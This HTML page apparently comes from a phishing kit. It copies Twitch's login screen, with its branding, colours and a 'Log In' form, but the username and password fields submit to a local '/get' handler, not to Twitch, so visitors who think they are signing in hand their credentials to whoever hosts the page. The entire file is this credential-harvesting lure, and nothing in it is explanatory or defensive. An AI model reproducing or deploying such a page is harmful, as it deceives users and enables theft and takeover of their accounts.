<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Twitch</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter','Helvetica Neue',sans-serif;background:#18181b;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:380px;text-align:center}
.logo{margin-bottom:24px}
.logo h1{font-size:32px;font-weight:800;color:#9146ff}
h2{font-size:20px;color:#efeff1;margin-bottom:24px;font-weight:600}
.form-group{margin-bottom:14px;text-align:left}
.form-group label{display:block;font-size:12px;color:#adadb8;margin-bottom:4px;font-weight:600}
.form-group input{width:100%;padding:14px;border:1px solid #3a3a3d;border-radius:6px;background:#2a2a2d;color:#efeff1;font-size:16px;outline:none}
.form-group input:focus{border-color:#9146ff}
.btn{width:100%;padding:14px;background:#9146ff;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:hover{background:#772ce8}
.btn:active{transform:scale(0.98)}
.or{margin:20px 0;color:#adadb8;font-size:14px}
.social-btn{width:100%;padding:12px;background:transparent;border:1px solid #3a3a3d;border-radius:6px;color:#efeff1;font-size:14px;cursor:pointer;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:10px}
.social-btn:hover{background:#2a2a2d}
.footer{margin-top:20px;font-size:13px;color:#adadb8}
.footer a{color:#9146ff;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo"><h1>twitch</h1></div>
<h2>Log In</h2>
<form action="/get" method="POST">
<div class="form-group">
<label>Username</label>
<input name="username" type="text" placeholder="Username" required autocomplete="off">
</div>
<div class="form-group">
<label>Password</label>
<input name="password" type="password" placeholder="Password" required autocomplete="off">
</div>
<button type="submit" class="btn">Log In</button>
</form>
<div class="footer">
Don't have an account? <a href="#">Sign Up</a>
</div>
</div>
</body>
</html>
